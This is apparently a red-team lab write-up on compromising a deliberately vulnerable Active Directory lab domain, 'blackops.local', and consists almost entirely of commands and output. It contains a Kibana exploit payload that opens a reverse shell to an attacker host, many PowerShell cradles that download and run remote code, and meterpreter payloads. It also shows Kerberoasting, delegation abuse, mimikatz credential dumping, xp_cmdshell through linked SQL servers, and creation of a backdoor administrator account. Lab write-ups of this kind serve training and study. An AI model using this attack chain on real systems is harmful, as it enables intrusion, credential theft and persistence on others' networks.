---
title : "Gustav Shen Vulnerable AD Writeup"
date: 2023-11-02 07:23:00 +0530
categories: [Red Team Lab]
tags: [bilibili,Vulnerable AD]
---

```bash
enumerate:

./nxc smb 192.168.0.0/24
SMB         192.168.0.52    445    FILE01           [*] Windows 6.1 Build 0 (name:FILE01) (domain:blackops.local) (signing:False) (SMBv1:False)
SMB         192.168.0.56    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:blackops.local) (signing:True) (SMBv1:False)
SMB         192.168.0.54    445    SRV01            [*] Windows 10.0 Build 17763 x64 (name:SRV01) (domain:blackops.local) (signing:False) (SMBv1:False)
SMB         192.168.0.51    445    WEB01            [*] Windows 6.1 Build 0 (name:WEB01) (domain:blackops.local) (signing:False) (SMBv1:False)
SMB         192.168.0.53    445    CLIENT01         [*] Windows 10.0 Build 19041 x64 (name:CLIENT01) (domain:blackops.local) (signing:False) (SMBv1:False)
SMB         192.168.0.55    445    SRV02            [*] Windows 10.0 Build 17763 x64 (name:SRV02) (domain:blackops.local) (signing:False) (SMBv1:False)

192.168.0.56 DC

domain:blackops.local


SSH         192.168.0.51    22     192.168.0.51     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         192.168.0.52    22     192.168.0.52     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3



----------------------------------------------------------------------------------------------------
nmap -sV -sC -p- -o nmap.out -vvv 192.168.0.51

22		ssh
25		smtp
80		http
110 	pop3
139 	netbios-ssn syn-ack Samba smbd 4.6.2
143 	imap        syn-ack Dovecot imapd
445 	Samba
993 	imaps
995		pop3s
5601 	kibana

----------------------------------------------------------------------------------------------------
smbclient -L 192.168.0.51


        Sharename       Type      Comment
        ---------       ----      -------
        webapp          Disk      Web app files
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (web01 server (Samba, Ubuntu))

webapp


smbmap -H 192.168.0.51

[+] IP: 192.168.0.51:445        Name: 192.168.0.51              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        webapp                                                  READ, WRITE     Web app files
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (web01 server (Samba, Ubuntu))


webapp  READ, WRITE 


----------------------------------------------------------------------------------------------------
5601 	kibana

Version: 6.5.0

https://github.com/mpgn/CVE-2019-7609

.es(*)
.props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/192.168.0.7/443 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

nc -lvnp 443                                  
listening on [any] 443 ...
connect to [192.168.0.7] from (UNKNOWN) [192.168.0.51] 44368
bash: cannot set terminal process group (773): Inappropriate ioctl for device
bash: no job control in this shell
kibana@web01:/$

https://0xffsec.com/handbook/shells/full-tty/

python3 -c 'import pty; pty.spawn("/bin/bash")'
kibana@web01:/$ ^Z
stty raw -echo && fg

无法提升权限
----------------------------------------------------------------------------------------------------
gobuster dir -u http://192.168.0.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

/wordpress

http://192.168.0.51/wordpress/

通过上下文发现相关可以凭据
hudson
Mason as mailadmin

Password

ssh faild

22		ssh 													X
25		smtp
80		http
110 	pop3
139 	netbios-ssn syn-ack Samba smbd 4.6.2
143 	imap        syn-ack Dovecot imapd
445 	Samba
993 	imaps
995		pop3s
5601 	kibana

----------------------------------------------------------------------------------------------------
110 	pop3

nc 192.168.0.51 110
+OK Dovecot (Ubuntu) ready.
user mailadmin
+OK
pass Password
+OK Logged in.
list
+OK 8 messages:
1 604
2 981
3 704
4 708
5 713
6 1479
7 1509
8 716
.
retr 1
+OK 604 octets
Return-Path: <hudson@web01>
X-Original-To: mailadmin@web01
Delivered-To: mailadmin@web01
Received: from hudson?web01 (localhost [127.0.0.1])
        by web01 (Postfix) with SMTP id EF64AE28E4
        for <mailadmin@web01>; Wed, 15 Jun 2022 20:45:15 -0400 (EDT)
Message-Id: <20220616004521.EF64AE28E4@web01>
Date: Wed, 15 Jun 2022 20:45:15 -0400 (EDT)
From: hudson@web01

Hey Mason, you finally changed your weak SSH and domain password, but please also change mailadmin's password as well...By the way, in case you forget your new password, your updated password is CIAAgent1984. please do not forget it...
.


mason:CIAAgent1984

----------------------------------------------------------------------------------------------------
ssh mason@192.168.0.51
mason@192.168.0.51's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

70 updates can be applied immediately.
70 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
You have mail.
Last login: Sat Jun 25 16:56:16 2022 from 192.168.0.26
mason@web01:~$ id
uid=1000(mason) gid=1000(mason) groups=1000(mason),24(cdrom),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),1003(jmp)
mason@web01:~$ whoami
mason
mason@web01:~$ sudo -l
Matching Defaults entries for mason on web01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User mason may run the following commands on web01:
    (root) NOPASSWD: /usr/bin/find

----------------------------------------------------------------------------------------------------
$ sudo find . -exec /bin/sh \; -quit
# whoami
root

root@web01:/home/mason# cat flag1.txt 
flag{th3_fi1st_bl00d}
----------------------------------------------------------------------------------------------------

root@web01:/etc# realm list
blackops.local
  type: kerberos
  realm-name: BLACKOPS.LOCAL
  domain-name: blackops.local
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@blackops.local
  login-policy: allow-realm-logins
root@web01:/etc# cat /etc/sssd/sssd.conf 

[sssd]
domains = blackops.local
config_file_version = 2
services = nss, pam

[domain/blackops.local]
default_shell = /bin/bash
krb5_store_password_if_offline = True
cache_credentials = True
krb5_realm = BLACKOPS.LOCAL
realmd_tags = manages-system joined-with-adcli 
id_provider = ad
fallback_homedir = /home/%u@%d
ad_domain = blackops.local
use_fully_qualified_names = True
ldap_id_mapping = True
access_provider = ad
root@web01:/etc# cat /etc/resolv.conf 
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "systemd-resolve --status" to see details about the actual nameservers.
nameserver 192.168.0.56
nameserver 127.0.0.53

当前机器在域内

----------------------------------------------------------------------------------------------------

root@web01:/etc# ls -la /etc/krb5.conf 
-rw-r--r-- 1 root root 71 Nov 16 11:59 /etc/krb5.conf
root@web01:/etc# ls -la /etc/krb5.keytab 
-rw-r----- 1 root root 1370 Nov 16 12:11 /etc/krb5.keytab

https://github.com/sosdave/KeyTabExtract

root@web01:/etc# python3 -m http.server 4444

python keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : BLACKOPS.LOCAL
        SERVICE PRINCIPAL : WEB01$/
        NTLM HASH : 5db7a1891649cef400f8cd6923bb4a69
        AES-256 HASH : 225f9088e80de3f9b69064bf671d89345eca94ee76a87c8f1d0459a4a793af0d
        AES-128 HASH : 99a41017c5243b62d15c9b255be7b40d
----------------------------------------------------------------------------------------------------
这里实际上WEB01$的NTLM HASH不准确,
我在DC上重新提取了

bloodhound-python -c ALL -u 'WEB01$@BLACKOPS.LOCAL' --hashes 00000000000000000000000000000000:cf9cc60b55fc5a50384dfad63914f309 -d BLACKOPS.LOCAL -ns 192.168.0.56 --dns-tcp
INFO: Found AD domain: blackops.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (blackops.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.blackops.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 6 computers
INFO: Connecting to LDAP server: dc.blackops.local
INFO: Found 13 users
INFO: Found 55 groups
INFO: Found 3 gpos
INFO: Found 5 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: file01.blackops.local
INFO: Querying computer: web01
INFO: Querying computer: client01.blackops.local
INFO: Querying computer: srv01.blackops.local
INFO: Querying computer: srv02.blackops.local
INFO: Querying computer: dc.blackops.local
WARNING: Could not resolve: web01: All nameservers failed to answer the query web01. IN A: Server Do53:192.168.0.56@53 answered SERVFAIL
INFO: Done in 00M 01S

----------------------------------------------------------------------------------------------------

ALEX.MASON@BLACKOPS.LOCAL

CIAAgent1984

密码重用

横向移动到file01

ssh alex.mason@BLACKOPS.LOCAL@192.168.0.52
alex.mason@BLACKOPS.LOCAL@192.168.0.52's password: 
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-39-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

134 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Jul  6 19:12:08 2022 from 192.168.0.252
alex.mason@blackops.local@file01:~$ 


----------------------------------------------------------------------------------------------------

alex.mason@blackops.local@file01:/home$ ls -la
total 24
drwxr-xr-x  6 root                         root                        4096 Jun 14  2022 .
drwxr-xr-x 20 root                         root                        4096 Jun 13  2022 ..
drwx------  2 administrator@blackops.local domain users@blackops.local 4096 Jun 14  2022 administrator@blackops.local
drwx------  6 alex.mason@blackops.local    domain users@blackops.local 4096 Jun 25  2022 alex.mason@blackops.local
drwx------  2 helen                        helen                       4096 Nov 16 12:08 helen
drwxr-x--- 19 ubuntu                       ubuntu                      4096 Jun 29  2022 ubuntu



suid find

find . -exec /bin/sh -p \; -quit

bash-5.1# cd helen/
bash-5.1# ls
flag2.txt  memo.txt
bash-5.1# cat flag2.txt 
flag{n0_n33d_r00t}
bash-5.1# cat memo.txt 
Just a memo...Don't forget to create a powershell script on Client host to check FTP folder automatically...


alex.mason@blackops.local@file01:/home$ tcpdump -i ens33 dst port 21
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:51:56.710293 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [S], seq 1517688950, win 8192, options [mss 1460,nop,wscale 0,nop,nop,sackOK], length 0
14:51:56.710504 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [.], ack 2642700623, win 8192, length 0
14:51:56.712765 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [P.], seq 0:14, ack 21, win 8172, length 14: FTP: OPTS UTF8 ON
14:51:56.713884 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [P.], seq 14:26, ack 47, win 8146, length 12: FTP: USER helen
14:51:56.714235 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [P.], seq 26:44, ack 81, win 8112, length 18: FTP: PASS Summer2022!
14:51:56.738187 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [P.], seq 44:50, ack 104, win 8089, length 6: FTP: QUIT
14:51:56.738332 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [.], ack 119, win 8075, length 0
14:51:56.738372 IP 192.168.0.53.59144 > 192.168.0.52.ftp: Flags [F.], seq 50, ack 119, win 8075, length 0


HELEN.PARK@BLACKOPS.LOCAL
Summer2022!

HELEN.PARK@BLACKOPS.LOCAL is GROUP HELPDESK@BLACKOPS.LOCAL

HELPDESK@BLACKOPS.LOCAL ->

IT Specialists who have RDP access to client01.

----------------------------------------------------------------------------------------------------
xfreerdp /u:HELEN.PARK /p:Summer2022! /d:BLACKOPS.LOCAL /cert:ignore /v:192.168.0.53 /dynamic-resolution

desktop flag

flag{you_g0t_h3r3!}


回收站有个可以文件

Resolved Tickets.txt

1: Purchase 50 CrowdStrike licenses.
2: Create a powershell script to automatically connect to and check FTP server.
3: Change Russell Adler's password to Ajobtodo!

RUSSELL.ADLER@BLACKOPS.LOCAL

Ajobtodo!
----------------------------------------------------------------------------------------------------
First Degree Object Control

RUSSELL.ADLER@BLACKOPS.LOCAL ->FRANK.WOODS@BLACKOPS.LOCAL
ForceChangePassword


The user FRANK.WOODS@BLACKOPS.LOCAL has generic write access to the user IR_OPERATOR@BLACKOPS.LOCAL.
GenericWrite


IR_OPERATOR is Incident Response Operator.


DF_OPERATOR@BLACKOPS.LOCAL is Digital Forensics Operator.

DF_OPERATOR RBCD srv01

----------------------------------------------------------------------------------------------------
C:\Users\helen.park>runas /netonly /user:blackops\russell.adler powershell

使用提供的凭据创建一个新的会话

PS C:\Windows\system32> whoami
blackops\helen.park


提前关闭了defender,无伤大雅.
----------------------------------------------------------------------------------------------------

IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/PowerView.ps1')

PS C:\Windows\Tasks> Set-DomainUserPassword -Identity FRANK.WOODS -AccountPassword (ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force) -Verbose
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'FRANK.WOODS'
VERBOSE: [Set-DomainUserPassword] Password for user 'FRANK.WOODS' successfully reset


C:\Users\helen.park>runas /netonly /user:blackops\FRANK.WOODS powershell

IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/PowerView.ps1')

set spn
Set-DomainObject -Identity IR_OPERATOR -Set @{serviceprincipalname='fake/client01'}



IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/adPEAS.ps1')

Invoke-adPEAS

$krb5tgs$23$*ir_operator$blackops.local$fake/client01@blackops.local*$85231B528AAC98C60191FFFD86D445C1$223FC458629AC1B7B5A93B6C721E0A88249781E08AE960DBC2AA0498B4EFE5DF0F93E7A9EB7ADC2AE9007B58A0FAC56719F5E73CBC4A572FCBB32E67BD61125480BED3A4F345DBD4B5D2BE527693DDF12E058473507A8C2FB1425C9FB0CDF3337F2D22A90EFCE31E5F072AAA54B37C6F4561CAB3F96338A12109FC1268E4EE69BEF4B420054A933722E2476439B3D7DE57EB3A32A1ECE544840664E3AD834B6ADC25FE32D37E88A0E0BE9BCAC627DE5EE451989FC39C1757F8B0B4A98ADF6CED59D7AF4108487A077E249AA7BF33AFA85C64262AB86FAED0A72C064E445103753C26ECF0E2DC97E3862EE4B519209C3B19463D7A408AA3DD58304B0B964B5AFB083916D77EC1167BB50352FECD5D8B57EA2A56463530E03C1072B9BD96CD56709E0CF174523D75E4D870F8C4902B71675402A2DEBBB85A5D6265CF4DD4A0A16E740B4AFC22EEF3C7C9B06D42D8A1FB2B9A5BD1A3CB632F93D6EF33FB338BF9C56F5F84534C20D049F2BAF7A221594A93B6D5C1360661E2D29CD152E3C1EADF5F02FE57FA6C642B7CD5C8B13A03494E09B0D112B21B3A6D6D901C3EBAFCE905F87A23789C34D251F3A4F201BA4291266028477AF76C4348F3C4F0A00C933A6C55CF547F9394C2B2D530563F60CD98A1D452AE0EE6602B6CE9CC12E6633E95E9563825EFE17338DCFBD134A2289A0C158E0EC987DEC4D5101EC0798F703F5F0FFC3A43ECEABAAF855212485CCB186C92A7360B0CD7BCE3EE816DEF61A10469A9382E7F0774EB865E21BF79499D54F1F7D39AE526700B4106684F80469EDF7D8FCC4FEEC821556EF8F1AA3D0EE6A6A2B46D3B8E396E3CCECB692833337AA0A1FA8E9BCDFE0070BBAC4962F361289FB3B54A00250AD6851FA07B49FDBE474B5379ECF4BAB00B94C78A215FF2E5187B0BE8B65F1A6E74301BC22F46C20A25063BB0CF2D4C706669971C50B5DE2A1EA721387F87B988358A837497C70761B719BED9AA42C18DCFBE982626C08DCEB8E5EA5C0AFB2CCF36DBB514C89C4D29B346DB5D9D7F77B34D14B5933CD5B24CAD14D33BBF788E645DBD5E998B86E0AA5BB5E5B1706401E9911712F9CD603D7369915BF4B0FFEA783E9842742D7376E9E50AFF1FA87AB4F17C6C931AD8C97FCAF65782D2D7BF9308035F1EAED1BABFB595C6B4A50134C2B92B8B56549CADB11E6F8331BB6DCB966CDFCBC56E3EDA3CBD2C261F82EB1406D30E9B149BD2782A5ECD5AAE32938C0AFF63EABA3E194DB59EB48304878C315482A410F8B51224399B4E15C0D4A375C5C1476F234870A607D69D43EF678AFCDD4BA9A0DE99D828A4A73FF7F3E52780BCB9AE8A5302F3E8B59C91198426D393AB96B2F7F2EE230B6B9186E8575EE43664BC01C23CB20E2863897B0E4FAE3D4B1B2465D52E8533F91B50CD7F0FDCA1EF78A33EE49F1B282115B0957EE3C16B372E6A12945BCDD9944085F913B635F6BCA2AEE0337472FE4997F60505ABA27659D8B71D8A4618D9ABEE7000328D089EAD582133C45EB44CE469701F0E0F223AEBC4468C25188963745F60A04BF8BFB71DAAD4AA0E16CABBE6A12B21249F742C1ED20AB71F4699C2F7E925571EE1


hashcat -a 0 -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt

ir_operator:Pass1kirsty
DF_OPERATOR:Pass1kirsty

C:\Users\helen.park>runas /netonly /user:blackops\DF_OPERATOR powershell

IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/Powermad.ps1')

PS C:\Windows\Tasks> New-MachineAccount -MachineAccount rbcd -Password $(ConvertTo-SecureString '123' -AsPlainText -Force)
[+] Machine account rbcd added

iwr http://192.168.0.7/ad.dll -o ad.dll
ipmo .\ad.dll

PS C:\Windows\Tasks> Set-ADComputer srv01 -PrincipalsAllowedToDelegateToAccount rbcd$ -Server 192.168.0.56 -Verbose
VERBOSE: Performing the operation "Set" on target "CN=SRV01,OU=SQL Server,DC=blackops,DC=local".

PS C:\Windows\Tasks> Get-NetComputer -Identity srv01

msds-allowedtoactonbehalfofotheridentity : {1, 0, 4, 128...}

$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("hash /domain:blackops.local /user:rbcd$ /password:123".Split())

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123
[*] Input username             : rbcd$
[*] Input domain               : blackops.local
[*] Salt                       : BLACKOPS.LOCALhostrbcd.blackops.local
[*]       rc4_hmac             : 3DBDE697D71690A769204BEB12283678
[*]       aes128_cts_hmac_sha1 : 5E72F49A919244D51827DE677A76E901
[*]       aes256_cts_hmac_sha1 : A0800390D3953EF1F29E031E948A8AA1718F87BFC44AFA360CD74D8A92A5B017
[*]       des_cbc_md5          : 0DE63BBCFBE043BC


[Rubeus.Program]::Main("s4u /user:rbcd$ /rc4:3DBDE697D71690A769204BEB12283678 /impersonateuser:administrator /msdsspn:cifs/srv01.blackops.local /ptt".Split())

s4u administrator faild


jason.hudson is a member of Monitor Group,
it has WinRM and RDP access to SRV01.

[Rubeus.Program]::Main("s4u /user:rbcd$ /rc4:3DBDE697D71690A769204BEB12283678 /impersonateuser:jason.hudson /msdsspn:cifs/srv01.blackops.local /altservice:cifs,http,host,winrm /ptt".Split())


PS C:\Windows\Tasks> Invoke-Command -ComputerName srv01.blackops.local -ScriptBlock{hostname}
srv01
PS C:\Windows\Tasks> Invoke-Command -ComputerName srv01.blackops.local -ScriptBlock{whoami}
blackops\jason.hudson

Invoke-Command -ComputerName srv01.blackops.local -ScriptBlock{iex(New-Object net.webclient).DownloadString('http://192.168.0.7/Runner.txt')}
----------------------------------------------------------------------------------------------------
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 192.168.0.7; set lport 443; set exitonsession false; run -zj"

osep runner powershell

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.7 LPORT=443 EXITFUNC=thread -f powershell


msf6 exploit(multi/handler) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  BLACKOPS\jason.hudson @ SRV01  192.168.0.7:443 -> 192.168.0.54:49709 (192.168.0.54)

msf6 exploit(multi/handler) > sessions 1
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: BLACKOPS\jason.hudson
meterpreter > sysinfo 
Computer        : SRV01
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows

----------------------------------------------------------------------------------------------------
meterpreter > shell
Process 5476 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32>cd C:\windows\tasks\
cd C:\windows\tasks\

C:\Windows\Tasks>powershell

IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/PowerUp.ps1')
Invoke-AllChecks

[*] Checking for AlwaysInstallElevated registry key...


AbuseFunction : Write-UserAddMSI





[*] Checking for Autologon credentials in registry...


DefaultDomainName    : BLACKOPS
DefaultUserName      : jason.hudson
DefaultPassword      : jkhnrjk2020!
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 





PS C:\Windows\Tasks> net localgroup "Remote Desktop Users"
net localgroup "Remote Desktop Users"
Alias name     Remote Desktop Users
Comment        Members in this group are granted the right to logon remotely

Members

-------------------------------------------------------------------------------
BLACKOPS\jason.hudson
The command completed successfully


xfreerdp /u:jason.hudson /p:jkhnrjk2020! /d:BLACKOPS.LOCAL /cert:ignore /v:192.168.0.54 /dynamic-resolution

https://github.com/KINGSABRI/MSI-AlwaysInstallElevated

PS C:\Windows\Tasks> iwr http://192.168.0.7/add1.msi -o add1.msi
PS C:\Windows\Tasks> iwr http://192.168.0.7/add2.msi -o add2.msi
PS C:\Windows\Tasks> .\add1.msi /q
PS C:\Windows\Tasks> .\add2.msi /q


PS C:\Windows\Tasks> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
BLACKOPS\Domain Admins
fsociety

PS C:\Windows\Tasks> net user fsociety
User name                    fsociety
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/17/2023 8:57:09 AM
Password expires             12/29/2023 8:57:09 AM
Password changeable          11/18/2023 8:57:09 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
-------------------------------------------------------------------------------
xfreerdp /u:fsociety /p:Passw0rd /cert:ignore /v:192.168.0.54 /dynamic-resolution

iwr http://192.168.0.7/mimikatz.exe -o mimikatz.exe


PS C:\Windows\Tasks> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)



ppl


iwr http://192.168.0.7/mimidrv.sys -o mimidrv.sys


mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords


Authentication Id : 0 ; 104018 (00000000:00019652)
Session           : Service from 0
User Name         : svc_sql
Domain            : BLACKOPS
Logon Server      : DC
Logon Time        : 11/17/2023 8:34:34 AM
SID               : S-1-5-21-2247275728-3314073706-3084591305-1110
        msv :
         [00000003] Primary
         * Username : svc_sql
         * Domain   : BLACKOPS
         * NTLM     : c905217230dc16016f90de922b2856f0
         * SHA1     : 178cdf71ac6811a07b8021293824c1db6caf98b7
         * DPAPI    : b68168ece036401a34ee2ef6389bc35c
        tspkg :
        wdigest :
         * Username : svc_sql
         * Domain   : BLACKOPS
         * Password : (null)
        kerberos :
         * Username : svc_sql
         * Domain   : BLACKOPS.LOCAL
         * Password : Kerberoasting?
        ssp :
        credman :


-------------------------------------------------------------------------------
svc_sql
c905217230dc16016f90de922b2856f0

Service Principal Names MSSQLSvc/srv02.blackops.local:1433
MSSQLSvc/srv01.blackops.local:1433
MSSQLSvc/srv02.blackops.local:DB02
MSSQLSvc/srv01.blackops.local:DB01

python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -p 1433 -windows-auth blackops/svc_sql@192.168.0.54 -hashes 00000000000000000000000000000000:c905217230dc16016f90de922b2856f0
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SRV01\DB01): Line 1: Changed database context to 'master'.
[*] INFO(SRV01\DB01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (BLACKOPS\svc_sql  BLACKOPS\svc_sql@master)>


SQL (BLACKOPS\svc_sql  BLACKOPS\svc_sql@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0

SQL (sa  dbo@master)> EXECUTE AS login = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1 


SQL (sa  dbo@master)> exec sp_linkedservers;
SRV_NAME     SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
----------   ----------------   -----------   --------------   ------------------   ------------   -------   
SRV01\DB01   SQLNCLI            SQL Server    SRV01\DB01       NULL                 NULL           NULL      

SRV02        SQLNCLI            SQL Server    SRV02            NULL                 NULL           NULL


SQL (sa  dbo@master)> select * from openquery("SRV02",' SELECT IS_SRVROLEMEMBER(''sysadmin'')');
    
-   
1

SQL (sa  dbo@master)> EXEC sp_serveroption 'srv02','rpc out','true';
SQL (sa  dbo@master)> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [SRV02]
[*] INFO(SRV02\DB02): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [SRV02]
[*] INFO(SRV02\DB02): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> EXEC('xp_cmdshell ''whoami'';')AT [SRV02]
output             
----------------   
blackops\svc_sql   

NULL               

SQL (sa  dbo@master)> EXEC('xp_cmdshell ''hostname'';')AT [SRV02]
output   
------   
srv02    

NULL


echo -en 'Iex((New-Object net.webclient).DownloadString("http://192.168.0.7/Runner.txt"))' | iconv -t UTF-16LE|base64 -w 0
SQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA3AC8AUgB1AG4AbgBlAHIALgB0AHgAdAAiACkAKQA=


EXEC('xp_cmdshell ''powershell -exec bypass -nop -enc SQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADAALgA3AC8AUgB1AG4AbgBlAHIALgB0AHgAdAAiACkAKQA='';')AT [SRV02]



meterpreter > getuid 
Server username: BLACKOPS\svc_sql
meterpreter > sysinfo 
Computer        : SRV02
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : BLACKOPS
Logged On Users : 9
Meterpreter     : x64/windows


IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.7/PowerUp.ps1')
Invoke-AllChecks


SeImpersonatePrivilege        Impersonate a client after authentication Enabled 


iwr http://192.168.0.7/GodPotato-NET4.exe -o GodPotato.exe

.\GodPotato.exe -cmd "net user fsociety Passw0rd /add && net localgroup administrators fsociety /add"

.\GodPotato.exe -cmd "net user fsociety Passw0rd /add"
.\GodPotato.exe -cmd "net localgroup administrators fsociety /add"

PS C:\Windows\Tasks> net user fsociety
net user fsociety
User name                    fsociety
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/17/2023 9:43:01 AM
Password expires             12/29/2023 9:43:01 AM
Password changeable          11/18/2023 9:43:01 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users                
Global Group memberships     *None                 
The command completed successfully.


xfreerdp /u:fsociety /p:Passw0rd /cert:ignore /v:192.168.0.55 /dynamic-resolution

-------------------------------------------------------------------------------
SRV02
